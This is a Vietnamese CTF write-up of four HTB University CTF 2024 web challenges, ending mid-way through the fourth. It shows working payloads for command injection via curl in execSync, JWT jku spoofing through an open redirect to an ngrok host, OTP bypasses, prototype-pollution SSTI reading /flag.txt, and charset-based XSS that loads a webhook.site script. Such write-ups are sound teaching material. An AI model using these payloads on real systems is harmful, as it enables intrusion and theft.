---
title: "HTB University CTF 2024"
description: "HTB University CTF 2024"
summary: "HTB University CTF 2024 writeup"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2024-12-16
draft: false
cover: ../../post/htbuni2024/feature.jpg
authors:
  - winky
---

| Category | Challenge Name | Difficulty |
| -------- | -------------- | ---------- |
| Web      | Armaxis  | Medium |
| Web      | Breaking Bank | Not really hard |
| Web      | Intergalactic Bounty | Hard |
| Web      | encoDecept | Very Hard |

## Armaxis

#### Source 

https://drive.google.com/file/d/1UxpqCJGXklVGBE1C1BwcnFUfJ3WEpb9V/view?usp=sharing

#### Hints

* Bypass OTP, command injection

#### Solution

Đề bài cho mình 2 trang web như sau

![image](https://hackmd.io/_uploads/Hk5QYHHBJl.png)

![image](https://hackmd.io/_uploads/By94YHHBJe.png)

<details>
<summary>Dockerfile</summary>
    
```Dockerfile
# Use Node.js base image with Alpine Linux
FROM node:alpine

# Install required dependencies for MailHog and supervisord
RUN apk add --no-cache \
    wget \
    supervisor \
    apache2-utils \
    curl

# Install MailHog binary
WORKDIR /
RUN wget https://github.com/mailhog/MailHog/releases/download/v1.0.1/MailHog_linux_amd64
RUN chmod +x MailHog_linux_amd64

# Prepare email directory and copy app files
RUN mkdir -p /email
COPY email-app /email

WORKDIR /email
RUN npm install

# Generate a random password and create authentication file for MailHog
RUN RANDOM_VALUE=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1) \
    && htpasswd -nbBC 10 test "$RANDOM_VALUE" > /mailhog-auth \
    && echo $RANDOM_VALUE > /email/password.txt

# Set working directory for the main app
WORKDIR /app

# Copy challenge files and install dependencies
COPY challenge .
RUN npm install

# Copy supervisord configuration
COPY config/supervisord.conf /etc/supervisor/conf.d/supervisord.conf

# Expose ports for the app and email client
EXPOSE 8080
EXPOSE 1337

COPY flag.txt /flag.txt

# Start supervisord
CMD ["supervisord", "-c", "/etc/supervisor/conf.d/supervisord.conf"]
```
    
</details>

<details>
<summary>supervisord.conf</summary>
    
```conf=
[supervisord]
user=root
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0
pidfile=/run/supervisord.pid

[program:node]
command=node index.js
directory=/app
autostart=true
autorestart=true
stdout_logfile=/dev/stdout
stderr_logfile=/dev/stderr
stdout_logfile_maxbytes=0
stderr_logfile_maxbytes=0


[program:mailhog]
command=/MailHog_linux_amd64 -api-bind-addr 127.0.0.1:9000 -ui-bind-addr 127.0.0.1:9000  -maildir-path /var/mail/ -storage maildir -auth-file=/mailhog-auth
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:email]
directory=/email
command=node index.js
autostart=true
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

```
    
</details>

Đọc qua cấu hình của web thì nó sẽ có 3 service, một là /app của web được expose trên port 1337, hai là email client được expose ở port 8080, ba là mailhog ở port 9000 dùng để gửi email

![image](https://hackmd.io/_uploads/H19LKBHr1g.png)

Đầu tiên mình tạo một account và đăng nhập nhưng không có gì hot cả nên mình đọc lại source

![image](https://hackmd.io/_uploads/rkNYeLBH1g.png)

```js
async function initializeDatabase() {
  try {
    await run(`CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email VARCHAR(255) UNIQUE,
            password VARCHAR(255),
            role VARCHAR(50)
        )`);

    await run(`CREATE TABLE IF NOT EXISTS weapons (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name VARCHAR(255),
            price REAL,
            note TEXT,
            dispatched_to VARCHAR(255),
            FOREIGN KEY (dispatched_to) REFERENCES users (email)
        )`);

    await run(`CREATE TABLE IF NOT EXISTS password_resets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            token VARCHAR(64) NOT NULL,
            expires_at INTEGER NOT NULL,
            FOREIGN KEY (user_id) REFERENCES users (id)
        )`);

    const userCount = await get(`SELECT COUNT(*) as count FROM users`);
    if (userCount.count === 0) {
      const insertUser = db.prepare(
        `INSERT INTO users (email, password, role) VALUES (?, ?, ?)`,
      );
      const runInsertUser = promisify(insertUser.run.bind(insertUser));

      await runInsertUser(
        "admin@armaxis.htb",
        `${crypto.randomBytes(69).toString("hex")}`,
        "admin",
      );
      insertUser.finalize();
      console.log("Seeded initial users.");
    }
  } catch (error) {
    console.error("Error initializing database:", error);
  }
}

initializeDatabase();

async function createUser(email, password, role = "user") {
  const query = `INSERT INTO users (email, password, role) VALUES (?, ?, ?)`;
  try {
    const result = await run(query, [email, password, role]);
    return result;
  } catch (error) {
    throw error;
  }
}
```

Có thể thấy các account tạo ra đều có role là user nhưng chỉ có email admin@armaxis.htb là mang role admin nên mình tìm xem có hàm nào liên quan đến role này không. Mình thử đọc qua file index.js trong router và file markdown.js và thấy có một điều thú vị

```js
//index.js

router.post("/weapons/dispatch", authenticate, async (req, res) => {
  const { role } = req.user;
  if (role !== "admin") return res.status(403).send("Access denied.");

  const { name, price, note, dispatched_to } = req.body;
  if (!name || !price || !note || !dispatched_to) {
    return res.status(400).send("All fields are required.");
  }

  try {
    const parsedNote = parseMarkdown(note);

    await dispatchWeapon(name, price, parsedNote, dispatched_to);

    res.send("Weapon dispatched successfully.");
  } catch (err) {
    console.error("Error dispatching weapon:", err);
    res.status(500).send("Error dispatching weapon.");
  }
});

//markdown.js

function parseMarkdown(content) {
    if (!content) return '';
    return md.render(
        content.replace(/\!\[.*?\]\((.*?)\)/g, (match, url) => {
            try {
                const fileContent = execSync(`curl -s ${url}`);
                const base64Content = Buffer.from(fileContent).toString('base64');
                return `<img src="data:image/*;base64,${base64Content}" alt="Embedded Image">`;
            } catch (err) {
                console.error(`Error fetching image from URL ${url}:`, err.message);
                return `<p>Error loading image: ${url}</p>`;
            }
        })
    );
}
```

Sau khi phân tích thì mình hiểu là chỉ có admin mới xài được hàm parseMarkdown dùng để gửi một markdown cho một user nào đó. Nhưng mà ở trong hàm parseMarkdown đó lại có ```const fileContent = execSync(`curl -s ${url}`);``` nên mình xác nhận đã bị dính lỗi command injection. Tại sao lại thế? Khi admin tạo một markdown có image thì hàm parseMarkdown sẽ lấy url source và đưa vào lệnh execSync nhưng nếu ta truyền vào một linux command thì sao? Giả sử như truyền một url source là '1.1.1.1; id' thì ngoài thực hiện curl lệnh execSync sẽ thực hiện luôn cả lệnh id từ đó leak được nội dung ra.

Ok thì ý tưởng là vậy nhưng làm sao có được role admin ?
Thì mình có ngó lại file database.js

```js
async function createPasswordReset(userId, token, expiresAt) {
  const query = `INSERT INTO password_resets (user_id, token, expires_at) VALUES (?, ?, ?)`;
  try {
    await run(query, [userId, token, expiresAt]);
  } catch (error) {
    throw error;
  }
}

async function getPasswordReset(token) {
  const query = `SELECT * FROM password_resets WHERE token = ? AND expires_at > ?`;
  try {
    const reset = await get(query, [token, Date.now()]);
    return reset;
  } catch (error) {
    throw error;
  }
}
```

Trong truy vấn tạo OTP thì có thêm vào param used_id nhưng khi get thì lại không. Qua đó mình có thể lấy OTP của user khác để đổi mật khẩu mail admin. Nên mình thực hiện đổi mật khẩu của mail ```test@email.htb``` mà đã được đề bài đưa lên port 8080 ở trong file trên

![image](https://hackmd.io/_uploads/HJmqKSSBkl.png)

Sau khi đổi mật khẩu thì mình catch được một cái request như sau

![image](https://hackmd.io/_uploads/Bk20X8rSJg.png)

Ok thì mình thử gen ra một cái token khác và thử đổi mật khẩu của mail admin và Bumphhh

![image](https://hackmd.io/_uploads/rkzN9SHSyl.png)

Vậy là mình đã đổi được mật khẩu của admin nên mình sẽ đăng nhập vào 

![image](https://hackmd.io/_uploads/r1UwcrBrJe.png)

Đây là nơi mà ta tạo note khi nãy 

![image](https://hackmd.io/_uploads/By4ucSBB1g.png)

Mình thử test một cái note xem 

![image](https://hackmd.io/_uploads/HyT-jBHHkx.png)

![image](https://hackmd.io/_uploads/Hk4GsBBBJe.png)

Ok ngon rồi, bây giờ chỉ cần thêm image trong markdown để lấy flag là xong.

![image](https://hackmd.io/_uploads/BkMUTBSSye.png)

![image](https://hackmd.io/_uploads/S1SATSSBkg.png)

Vậy là mình đã command injection thành công ở đây mình check source của image thì đã thấy bị base64 encode nên mình tiến hành decode lại.

![image](https://hackmd.io/_uploads/H1Jx0SSr1x.png)

Và chúng ta đã có flag

![image](https://hackmd.io/_uploads/rkd70HBBkl.png)

Flag : HTB{FAKE_FLAG_FOR_TESTING}


## Breaking Bank

#### Source

https://drive.google.com/file/d/1W2nBbtwtoO5JN_ZLkBz31ORjzdiL03Kc/view?usp=sharing

#### Hints

* JWT authentication bypass, OTP bypass

#### Solution

Đề bài cho mình một trang web như sau

![image](https://hackmd.io/_uploads/H1g7BY8S1x.png)

![image](https://hackmd.io/_uploads/BkZNBFUryx.png)

Mở devtool thì mình thấy trang web có sử dụng JWT để lưu session

![image](https://hackmd.io/_uploads/BJY4rYUrke.png)

Sau khi đọc source thì đây là những file mình cần lưu ý

<details>
<summary>jwksService.js</summary>

```js
import crypto from 'crypto';
import jwt from 'jsonwebtoken';
import axios from 'axios';
import { v4 as uuidv4 } from 'uuid';
import { setKeyWithTTL, getKey } from '../utils/redisUtils.js';

const KEY_PREFIX = 'rsa-keys';
const JWKS_URI = 'http://127.0.0.1:1337/.well-known/jwks.json';
const KEY_ID = uuidv4();

export const generateKeys = async () => {
    const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });

    const publicKeyObject = crypto.createPublicKey(publicKey);
    const publicJwk = publicKeyObject.export({ format: 'jwk' });

    const jwk = {
        kty: 'RSA',
        ...publicJwk,
        alg: 'RS256',
        use: 'sig',
        kid: KEY_ID,
    };

    const jwks = {
        keys: [jwk],
    };

    await setKeyWithTTL(`${KEY_PREFIX}:private`, privateKey, 0);
    await setKeyWithTTL(`${KEY_PREFIX}:jwks`, JSON.stringify(jwks), 0);
};

const getPrivateKey = async () => {
    const privateKey = await getKey(`${KEY_PREFIX}:private`);
    if (!privateKey) {
        throw new Error('Private key not found in Redis. Generate keys first.');
    }
    return privateKey;
};

export const getJWKS = async () => {
    const jwks = await getKey(`${KEY_PREFIX}:jwks`);
    if (!jwks) {
        throw new Error('JWKS not found in Redis. Generate keys first.');
    }
    return JSON.parse(jwks);
};

export const createToken = async (payload) => {
    const privateKey = await getPrivateKey();
    return jwt.sign(payload, privateKey, {
        algorithm: 'RS256',
        header: {
            kid: KEY_ID,
            jku: JWKS_URI,
        },
    });
};

export const verifyToken = async (token) => {
    try {
        const decodedHeader = jwt.decode(token, { complete: true });

        if (!decodedHeader || !decodedHeader.header) {
            throw new Error('Invalid token: Missing header');
        }

        const { kid, jku } = decodedHeader.header;

        if (!jku) {
            throw new Error('Invalid token: Missing header jku');
        }

        // TODO: is this secure enough?
        if (!jku.startsWith('http://127.0.0.1:1337/')) {
            throw new Error('Invalid token: jku claim does not start with http://127.0.0.1:1337/');
        }

        if (!kid) {
            throw new Error('Invalid token: Missing header kid');
        }

        if (kid !== KEY_ID) {
            return new Error('Invalid token: kid does not match the expected key ID');
        }

        let jwks;
        try {
            const response = await axios.get(jku);
            if (response.status !== 200) {
                throw new Error(`Failed to fetch JWKS: HTTP ${response.status}`);
            }
            jwks = response.data;
        } catch (error) {
            throw new Error(`Error fetching JWKS from jku: ${error.message}`);
        }

        if (!jwks || !Array.isArray(jwks.keys)) {
            throw new Error('Invalid JWKS: Expected keys array');
        }

        const jwk = jwks.keys.find((key) => key.kid === kid);
        if (!jwk) {
            throw new Error('Invalid token: kid not found in JWKS');
        }

        if (jwk.alg !== 'RS256') {
            throw new Error('Invalid key algorithm: Expected RS256');
        }

        if (!jwk.n || !jwk.e) {
            throw new Error('Invalid JWK: Missing modulus (n) or exponent (e)');
        }

        const publicKey = jwkToPem(jwk);

        const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
        return decoded;
    } catch (error) {
        console.error(`Token verification failed: ${error.message}`);
        throw error;
    }
};

const jwkToPem = (jwk) => {
    if (jwk.kty !== 'RSA') {
        throw new Error("Invalid JWK: Key type must be 'RSA'");
    }

    const key = {
        kty: jwk.kty,
        n: jwk.n.toString('base64url'),
        e: jwk.e.toString('base64url'),
    };

    const pem = crypto.createPublicKey({
        key,
        format: 'jwk',
    });

    return pem.export({ type: 'spki', format: 'pem' });
};
```

</details>

<details>
<summary>otpService.js</summary>

```js
import { setHash, hgetField, deleteKey, getKeysByPattern } from '../utils/redisUtils.js';

let isRotating = false;

export const generateOtp = () => {
  return Math.floor(1000 + Math.random() * 9000).toString();
};

export const setOtpForUser = async (userId) => {
  const otp = generateOtp();
  const ttl = 60;

  await setHash(`otp:${userId}`, { otp, expiresAt: Date.now() + ttl * 1000 });

  return otp;
};

export const initializeOtps = async () => {
    const userKeys = await getKeysByPattern('user:*');

    for (const userKey of userKeys) {
        const userId = userKey.split(':')[1];
        await setOtpForUser(userId);
    }
};

export const validateOtp = async (userId, inputOtp) => {
  const otpKey = `otp:${userId}`;
  const storedOtp = await hgetField(otpKey, 'otp');

  if (!storedOtp || storedOtp !== inputOtp) {
    return false;
  }

  await deleteKey(otpKey);
  return true;
};

export const rotateOtps = async () => {
  try {
    const userKeys = await getKeysByPattern('user:*');

    const rotatePromises = userKeys.map(async (userKey) => {
      const userId = userKey.split(':')[1];
      await setOtpForUser(userId);
    });

    await Promise.all(rotatePromises);
  } catch (error) {
    console.error('Error during OTP rotation:', error);
  }
};


export const safelyRotateOtps = async () => {
  if (isRotating) {
    console.warn('Previous OTP rotation is still in progress. Skipping this interval.');
    return;
  }

  isRotating = true;
  try {
    await rotateOtps();
  } catch (error) {
    console.error('Error during OTP rotation:', error);
  } finally {
    isRotating = false;
  }
};

setInterval(safelyRotateOtps, 60000);
```

</details>

<details>
<summary>flagService.js</summary>

```js
import { getBalancesForUser } from '../services/coinService.js';
import fs from 'fs/promises';

const FINANCIAL_CONTROLLER_EMAIL = "financial-controller@frontier-board.htb";

/**
 * Checks if the financial controller's CLCR wallet is drained
 * If drained, returns the flag.
 */
export const checkFinancialControllerDrained = async () => {
    const balances = await getBalancesForUser(FINANCIAL_CONTROLLER_EMAIL);
    const clcrBalance = balances.find((coin) => coin.symbol === 'CLCR');

    if (!clcrBalance || clcrBalance.availableBalance <= 0) {
        const flag = (await fs.readFile('/flag.txt', 'utf-8')).trim();
        return { drained: true, flag };
    }

    return { drained: false };
};
```

</details>

Phân tích : 
* Theo như file flagService thì nhiệm vụ của ta là làm cho clcrBalance không tồn tại hoặc không có đồng clcr nào trong tài khoản financial-controller@frontier-board.htb.
* Vậy phải làm sao ở đây trang web mình có xài JWT nên mình nghĩ sẽ có liên quan đến việc thay đổi JWT từ đó thay đổi được người dùng và tương tác được với các feature của user trên
* Ngoải ra khi chuyên tiền thì mình phải xác nhận OTP nên mình sẽ tìm cách bypass nó

Đầu tiên mình phân tích JWT của một account thì nó sử dụng RSASHA256 để tạo signature 
    
![image](https://hackmd.io/_uploads/SJlCUFLSkx.png)

Vậy làm sao để crack nó? Thì ở đây mình sẽ tạo một cái public và private key bằng keyid của JWT trên trang web https://mkjwk.org/
    
![image](https://hackmd.io/_uploads/rk9kt9Lryg.png)

Sử dụng trình chuyển dổi sang file pem https://8gwifi.org/jwkconvertfunctions.jsp thì mình có kết quả sau
    
![image](https://hackmd.io/_uploads/SJgFlYcUSke.png)

Nhưng còn 1 vấn đề là jwt sử dụng jku từ url http://127.0.0.1:1337/.well-known/jwks.json để check signature nhưng key ở trên mình generate ra thì không trùng với của web
    
![image](https://hackmd.io/_uploads/S11YDF5HJx.png)

Đọc lại thì có đoạn này để check jku 
    
```js
// TODO: is this secure enough?
if (!jku.startsWith('http://127.0.0.1:1337/')) {
    throw new Error('Invalid token: jku claim does not start with http://127.0.0.1:1337/');
}
```
    
Vậy là jku phải bắt đầu bẳng url http://127.0.0.1:1337/ nên mình không thể sử dụng file từ bên ngoài. Nhưng ... Ở đây mình có thể tận dụng api analytics của web để redirect tới web của mình
    
Mình thực hiện host một service express sau và kết nối ngrok : 
    
```js
const express = require('express')

const app = express()

app.get('/', (req, res) => {
    res.status(200).send("Hello")
})

app.get('/jwks.json', (req, res) => {
    const a = {"keys":[{"kty":"RSA","n":"n10fUYzMMWdWlidSZI3Azj6J8EH57ex7wiefQboOYEUskaC3Mx9SDD96ch2STzoLgmOaqO_-Y8R5lbh9o_UYPrebaJY1OnGhLmGFxh6x2jDIWYdeixuQ8TpmnMUfmX6UGT5zQf-CYdJgKtmmDfxL0B3cbkJ-PNs4uIqiYzXXNO2BMRtJGodsrfVBPDjvyGG9Q7L_CRu95Zo5cLP3iaqIVHfZim23Pryq2iADefdbwJhaBNZzzGlxN2a_8u7o7exF2S09gcB5-5UOxoYzr34rdDd-PySFIYw1E_n5RqyT_kkxLzg_lhUYN4XxjaAxusMXsu1yMVMMohMFqii_iCoypQ","e":"AQAB","alg":"RS256","use":"sig","kid":"f49fbd81-b201-4137-9410-186e64a1d551"}]}
    res.status(200).json(a)
})

app.listen(5000, "127.0.0.1", () => {
    console.log("Connect to 5000")
})    
```
    
Sau đó sử dụng payload sau để giả jku
    
`"jku": "http://127.0.0.1:1337/api/analytics/redirect?ref=a&<NGROK-SERVER>`
    
![image](https://hackmd.io/_uploads/rJ5Cu5IByx.png)

Ok và signature đã được verify. Mình sẽ thực hiện đổi user thành financial-controller@frontier-board.htb để sử dụng
    
![image](https://hackmd.io/_uploads/ryF5YqUH1g.png)

Dán vào web thì mình vào được wallet của user financial-controller
    
![image](https://hackmd.io/_uploads/r1HFF9LBkl.png)

Mình sẽ thực hiện chuyển hết CLCR nhưng trước đó phải kết bạn với một người nào đó để chuyển
    
![image](https://hackmd.io/_uploads/HkdaY5IHJe.png)

![image](https://hackmd.io/_uploads/H1ng5cLHyg.png)

![image](https://hackmd.io/_uploads/BJkzqq8Bke.png)
    
![image](https://hackmd.io/_uploads/SknG59UH1x.png)

Ok sau khi kết bạn thì mình đã có user để chuyển 
    
![image](https://hackmd.io/_uploads/r1lOq9IB1x.png)

Nhưng lại bắt buộc có OTP để confirm việc chuyển
    
![image](https://hackmd.io/_uploads/ry-K5c8rJg.png)

Ok thì mình đọc lại file otpMiddleware.js thì thấy hàm check OTP như sau. Ở đây OTP có dạng là số có 4 chữ số nhưng lại check bằng hàm include có nghĩa là mình có thể gen ra tất cả các số có 4 chữ số sau đó web sẽ check valid OTP có trong chuỗi đó không. Thì chắc chắn là có rồi

```js
import { hgetField } from '../utils/redisUtils.js';

export const otpMiddleware = () => {
  return async (req, reply) => {
    const userId = req.user.email;
    const { otp } = req.body;

    const redisKey = `otp:${userId}`;
    const validOtp = await hgetField(redisKey, 'otp');

    if (!otp) {
      reply.status(401).send({ error: 'OTP is missing.' });
      return
    }

    if (!validOtp) {
      reply.status(401).send({ error: 'OTP expired or invalid.' });
      return;
    }

    // TODO: Is this secure enough?
    if (!otp.includes(validOtp)) {
      reply.status(401).send({ error: 'Invalid OTP.' });
      return;
    }
  };
};
```

Mình sẽ sử dụng đoạn script sau để gen ra 
    
```js
s = ""
for (let i=0; i <<= 10000; i++){
    s += String(i).padStart(4, '0');
}
console.log(s)
```

![image](https://hackmd.io/_uploads/B19QA58SJl.png)

Sau khi gen ra thì mình có thể gửi request thành công và chuyển được hết đồng CLCR

                       
![image](https://hackmd.io/_uploads/HJGYyj8rye.png)

![image](https://hackmd.io/_uploads/ry4kejUHyx.png)

Cuối cùng ta refresh lại page để nhận flag
                       
![image](https://hackmd.io/_uploads/Hk_lgi8SJl.png)

Flag : HTB{f4k3_fl4g_f0r_t35t1ng}

## Intergalactic Bounty

#### Source

https://drive.google.com/file/d/1pwyKmN1VvCn0OL6lhaillIeb9iu5T6W5/view?usp=sharing

#### Hints

* Bypass OTP, prototype pollution, SSTI
    
#### Solution

Đề bài cho mình một trang web và một hộp thư của email test@email.htb
    
![image](https://hackmd.io/_uploads/BkThNP_S1g.png)
    
![image](https://hackmd.io/_uploads/BJRT4vdryg.png)

Ở đây thì khi mình đăng nhập thì phải có OTP để vào account 
    
![image](https://hackmd.io/_uploads/HJl8V__B1x.png)

```js
const registerAPI = async (req, res) => {
  const { email, password, role = "guest" } = req.body;
  const emailDomain = emailAddresses.parseOneAddress(email)?.domain;

  if (!emailDomain || emailDomain !== 'interstellar.htb') {
    return res.status(200).json({ message: 'Registration is not allowed for this email domain' });
  }

  try {
    await User.createUser(email, password, role);
    return res.json({ message: "User registered. Verification email sent.", status: 201 });
  } catch (err) {
    return res.status(500).json({ message: err.message, status: 500 });
  }
};    
```
    
Đoạn code trên dùng để check email đăng ký phải có phần mail là interstellar.htb nhưng email cho ta là test@email.htb nên mình phải tìm cách bypass
    
Sau khi thử hàm parseOneAddress thì mình nhận thấy nó sẽ lấy phần @ đằng trước để tách username và mail nhưng khi được bọc lại bằng dấu "" thì nó sẽ sử dụng dấu @ đằng sau.
    
![image](https://hackmd.io/_uploads/SJ5ox_OS1g.png)

Từ đó mình có ý tưởng sẽ sử dụng payload sau `"test@email.htb a"@interstellar.htb` để tách mail ra để check. Mặt khác, phần user cũng được nodemailer sử dụng là test@email.htb và gửi otp đến như hình sau 

![image](https://hackmd.io/_uploads/rJCsVOOHkg.png)

```js
User.createUser = async function (email, password, role = "guest") {
  try {
    const verificationCode = generateRandomCode();
    const user = await this.create({ email, password, role, verificationCode });
    return user;
  } catch (err) {
    throw new Error("Error creating user");
  }
};    
```
    
Ngoài ra trong model của user truyền vào role mặc định là guest nhưng mình có thể add thêm trong khi đăng ký là admin để set role lại như sau
    
![image](https://hackmd.io/_uploads/S1b1Bu_Skl.png)

Ok, sau khi có OTP và account role admin thì mình tiến hành đăng nhập vào 
    
![image](https://hackmd.io/_uploads/S1Nzrdurkl.png)

Ở đây mình thử add một cái bounty và có được một response như sau
    
![image](https://hackmd.io/_uploads/SyBhpoFSkl.png)

Sau khi đọc hàm transmit và doc của needle thì mình có thể dùng proto option để needle fetch một cái html của mình về và lưu vào một file nào đó, và trong file này mình có thể bỏ vào SSTI để cat được flag từ máy chủ
    
```js
const fetchURL = async (url) => {
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    throw new Error("Invalid URL: URL must start with http or https");
  }

  const options = {
    compressed: true,
    follow_max: 0,
  };

  return new Promise((resolve, reject) => {
    needle.get(url, options, (err, resp, body) => {
      if (err) {
        return reject(new Error("Error fetching the URL: " + err.message));
      }
      resolve(body);
    });
  });
};    
```
    


![image](https://hackmd.io/_uploads/Bk2-gvYBke.png)

Ok thì mình tiến hành PUT thêm vào proto options để lưu nội dung được fetch vào file /app/views/index.html
    
![image](https://hackmd.io/_uploads/Bk49d3FHyg.png)

Ở đây mình sẽ ngrok một cái server trả về template SSTI như sau
    
```python
from flask import *

app = Flask(__name__)

@app.route('/', methods=["GET", "POST"])
def home():
    return "{{ 7 * 7 }}"

app.run(port=3001)
```
    


![image](https://hackmd.io/_uploads/SkysunKrJg.png)

Ok thì khi mình fetch nhận được như sau thì chắc là nội dung này đã được lưu vào file trên
    
![image](https://hackmd.io/_uploads/HJXp_ntr1x.png)

Sau khi mình vào http://127.0.0.1:1337 thì không có chuyện gì xảy ra nên chắc là server không bật debug, nên mình dọc lại config của supervisord
    
```supervisord
[program:node]
directory=/app
command=node index.js
autostart=true
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0    
```
    
Ở đây khi xảy ra lỗi thì server sẽ tự restart và chạy lại các file nên mình có thể trigger một lỗi để server build lại
    
![image](https://hackmd.io/_uploads/S1Gyt3Frke.png)

Ok sau khi build thì khi vào lại mình nhận được kết quả sau    


    
![image](https://hackmd.io/_uploads/ByGet3tSkx.png)

Ok quá ngon, mình đã SSTI thành công. Bây giờ chỉ cần thay đổi payload là có thể lấy được flag
    
        
```python
from flask import *

app = Flask(__name__)

@app.route('/', methods=["GET", "POST"])
def home():
    return "range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")()"

app.run(port=3001)
```
    
![image](https://hackmd.io/_uploads/HkGmcnKryx.png)

![image](https://hackmd.io/_uploads/S13452KBkx.png)

![image](https://hackmd.io/_uploads/B1jHchYr1e.png)

![image](https://hackmd.io/_uploads/B14U93tr1e.png)

Flag : HTB{f4k3_fl4g_f0r_testing}    

## encoDecept

#### Source

https://drive.google.com/file/d/1c12cRXHC89bspsOMR6p5Azcbj_EaS-WU/view?usp=sharing

#### Hints

* Missing charset, ORM leak, XSS, Insecure deserialization, privilege escalation

#### Solution

Bài cho mình một trang web như sau có chức năng chỉnh sửa bio, report contract và tạo contract
    
![image](https://hackmd.io/_uploads/ByiYJaFryx.png)

![image](https://hackmd.io/_uploads/BkSAyH9HJe.png)

![image](https://hackmd.io/_uploads/Syx1rr9H1l.png)
    
Nhìn qua database có thể thấy khi tạo một user mặc định sẽ là role guest. Ngoài ra có 2 account admin và contract_manager nữa nên mình nghĩ bài này sẽ có dạng privilege escalation

Mình thử vào trang bio và thay đổi thì thấy một điều đặc biệt là content type không có charset. Lúc này thì ta có thể XSS bằng cách sử dụng escape character của ISO-JP-2022. https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/
    
![image](https://hackmd.io/_uploads/Hkq-cScr1e.png)

Ở đây mình sử dụng payload sau `![%1b$@](a)+%1B(B+![b](onerror=alert(1)//)` để thực hiện XSS. Cụ thể thì khi bung ra image thì nó có dạng `<img src=a alt="%1b$@">%1B(B<img src="onerror=alert(1)//" alt="b"/>` và qua escape character của ISO-JP-2022 thì nó sẽ trở thành `<img src=a alt="¥"><img src="onerror=alert(1)//" alt="b"/>` và lệnh alert sẽ được thực hiện

![image](https://hackmd.io/_uploads/S1wwqHqHyg.png)

Từ đó mình có payload sau để thực hiện fetch về webhook
    
`![\x1b$@](a)+\x1B(B+![b](onerror=s=document.createElement('script');s.src='https://webhook.site/30ef8bd4-a54e-4f28-9975-876da0939e17';document.body.appendChild(s);//)`

Nhưng đây chỉ là self xss có nghĩa là chỉ user mình đăng nhập mới có thể XSS nên mình tìm cách để làm với contract_manager
    
<details>
<summary>nginx.conf</summary>
    
```nginx
user nginx;

worker_processes auto;

pcre_jit on;

error_log /var/log/nginx/error.log warn;

include /etc/nginx/modules/*.conf;
include /etc/nginx/conf.d/*.conf;

events {
    worker_connections 1024;
}

http {
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;

    gzip on;
    gzip_disable "msie6";

    proxy_cache_path /var/cache/nginx/my_cache levels=1:2 keys_zone=my_cache:10m max_size=1g inactive=60m use_temp_path=off;

    server {
        listen 1337;
        server_name _;

        location ~ \.(css|js|jpg|jpeg|png|gif|ico|woff|woff2|ttf|svg|eot|html|json)$ {
            proxy_cache my_cache;
            proxy_cache_key "$uri$is_args$args";
            proxy_cache_valid 200 5m;
            proxy_cache_valid 404 1m;

            proxy_pass http://127.0.0.1:3000;

            proxy_set_header Host $http_host; # Pass original host and port
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

            proxy_http_version 1.1;
            add_header X-Cache-Status $upstream_cache_status;
        }

        location / {
            proxy_pass http://127.0.0.1:3000;

            proxy_set_header Host $http_host; # Pass original host and port
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

            proxy_http_version 1.1;
            add_header X-Cache-Status $upstream_cache_status;
        }
    }
}    
```


    
</details>
    
    
Trong file nginx conf thì khi endpoint có đuôi là (css|js|jpg|jpeg|png|gif|ico|woff|woff2|ttf|svg|eot|html|json) sẽ được đưa vào cache và nếu ta gọi một lần nữa thì sẽ được lưu lại. Vì thế ý tưởng của mình là đưa XSS lên để redirect tới.
Nhưng làm sao để gọi file có đuôi trên trong khi endpoint mình cần là /setting
    
Thì mình có tìm ra cách bypass như sau 
    
![image](https://hackmd.io/_uploads/rkRaNWiBJx.png)
    
Ok thì mình có thể get 2 lần endpoint /setting.ico để có thể lưu cache lại
    
![image](https://hackmd.io/_uploads/Bke_669B1g.png)

![image](https://hackmd.io/_uploads/BkgJ0p5Hkg.png)

Và mình để thực hiện XSS thành công
    
Ok, tiếp theo mình sẽ thử vào contract_manager qua database của docker xem có gì hot

Ở đây ta có thể search và filter tất cả các contract nhưng cũng không có gì khai thác được
    
![image](https://hackmd.io/_uploads/HknQmkjHJg.png)

Nên mình đọc lại source của file ./interstellarAPI/contracts/views.py
    
```python
class FilteredContractsView(APIView):
    permission_classes = [IsAuthenticated, IsContractManagerOrAdmin]

    def post(self, request, format=None):
        try:
            if request.data.get("all") == True:
                contracts = Contract.objects.all()
            else:
                filtered_data = {key: value for key, value in request.data.items() if key != "all"}
                contracts = Contract.objects.filter(**filtered_data)
                
            serializer = ContractSerializer(contracts, many=True)
        except Exception as e:
            return Response({"error": str(e)}, status=status.HTTP_400_BAD_REQUEST)
            
        return Response(serializer.data, status=status.HTTP_200_OK)    
```
    
Dòng này khá sus `contracts = Contract.objects.filter(**filtered_data)` vì ta có thể tìm kiếm những thứ k phải là original như đã phân tích trong blog này https://www.elttam.com/blog/plormbing-your-django-orm/

    
```python
class Contract(models.Model):
    class Status(models.TextChoices):
        DRAFT = 'draft', 'Draft'
        PENDING_REVIEW = 'pending_review', 'Pending Review'
        APPROVED = 'approved', 'Approved'
